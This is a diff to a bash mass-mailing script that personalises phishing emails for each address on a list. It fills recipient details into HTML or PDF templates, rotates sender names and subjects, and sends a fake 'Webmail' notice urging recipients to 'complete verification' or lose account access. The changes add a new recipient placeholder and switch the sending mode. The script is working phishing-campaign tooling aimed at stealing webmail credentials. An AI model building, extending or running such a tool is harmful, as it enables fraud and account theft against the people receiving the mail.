@@ -367,7 +367,7 @@ NAME_FILE="name.txt"
 LOG_FILE="send_log_\$(date +%Y%m%d).txt"
 
 # Mode selection (html, htmlpdf, txtpdf, txthtml)
-MODE="htmlpdf"  # Change to desired mode: html, htmlpdf, txtpdf, or txthtml
+MODE="html"  # Change to desired mode: html, htmlpdf, txtpdf, or txthtml
 
 # Initialize counters
 TOTAL=\$(wc -l < "\$EMAIL_LIST")
@@ -433,17 +433,18 @@ process_pdf_template() {
     local temp_pdf=\$(mktemp --suffix=".pdf")
     
     # Process the PDF template with variables
-    sed \\
-        -e "s|{date}|\$current_date|g" \\
-        -e "s|{recipient-email}|\$email|g" \\
-        -e "s|{recipient-user}|\$email_user|g" \\
-        -e "s|{recipient-domain}|\$email_domain|g" \\
-        -e "s|{name}|\$random_name|g" \\
-        -e "s|{random-name}|\$(get_random_name)|g" \\
-        -e "s|{random-number}|\$random_number|g" \\
-        -e "s|{sender-email}|$username@$domain|g" \\
-        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \\
-        -e "s|{base64-encryptedrecipents-email}|\$base64_email|g" \\
+    sed \
+        -e "s|{date}|\$current_date|g" \
+        -e "s|{recipient-email}|\$email|g" \
+        -e "s|{recipient-user}|\$email_user|g" \
+        -e "s|{recipient-domain}|\$email_domain|g" \
+        -e "s|{recipient-emailuser-domain}|\$email_user/\$email_domain|g" \
+        -e "s|{name}|\$random_name|g" \
+        -e "s|{random-name}|\$(get_random_name)|g" \
+        -e "s|{random-number}|\$random_number|g" \
+        -e "s|{sender-email}|$username@$domain|g" \
+        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
+        -e "s|{base64-encryptedrecipents-email}|\$base64_email|g" \
         "\$PDF_TEMPLATE" > "\$temp_pdf"
     
     echo "\$temp_pdf"
@@ -476,13 +477,14 @@ while IFS= read -r email; do
     SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
 
     SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
-    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \\
-        -e "s|{date}|\$CURRENT_DATE|g" \\
-        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \\
-        -e "s|{recipient-user}|\$EMAIL_USER|g" \\
-        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \\
-        -e "s|{name}|\$RANDOM_NAME|g" \\
-        -e "s|{random-name}|\$(get_random_name)|g" \\
+    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
+        -e "s|{date}|\$CURRENT_DATE|g" \
+        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
+        -e "s|{recipient-user}|\$EMAIL_USER|g" \
+        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
+        -e "s|{recipient-emailuser-domain}|\$EMAIL_USER/\$EMAIL_DOMAIN|g" \
+        -e "s|{name}|\$RANDOM_NAME|g" \
+        -e "s|{random-name}|\$(get_random_name)|g" \
         -e "s|{random-number}|\$RANDOM_NUMBER|g")
 
     echo "Processing: \$CLEAN_EMAIL"
@@ -495,6 +497,7 @@ while IFS= read -r email; do
         -e "s|{recipient-email}|\$CLEAN_EMAIL|g"
         -e "s|{recipient-user}|\$EMAIL_USER|g"
         -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g"
+        -e "s|{recipient-emailuser-domain}|\$EMAIL_USER/\$EMAIL_DOMAIN|g"
         -e "s|{name}|\$RANDOM_NAME|g"
         -e "s|{random-name}|\$(get_random_name)|g"
         -e "s|{random-number}|\$RANDOM_NUMBER|g"
@@ -523,7 +526,7 @@ while IFS= read -r email; do
             cat <<EOF > "\$TEMP_BODY"
 Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.
 
-Webmail © 2025. All rights reserved.
+Webmail Â© 2025. All rights reserved.
 EOF
             PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
             ;;
@@ -533,7 +536,7 @@ EOF
             cat <<EOF > "\$TEMP_BODY"
 Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.
 
-Webmail © 2025. All rights reserved.
+Webmail Â© 2025. All rights reserved.
 EOF
             TEMP_HTML=\$(mktemp --suffix=".html")
             sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_HTML"
@@ -607,7 +610,7 @@ done < "\$EMAIL_LIST"
 
 echo "Completed at \$(date)" >> "\$LOG_FILE"
 echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
-echo "Full log: \$LOG_FILE"
+echo "Full log: "\$LOG_FILE""
 EOL
 
 
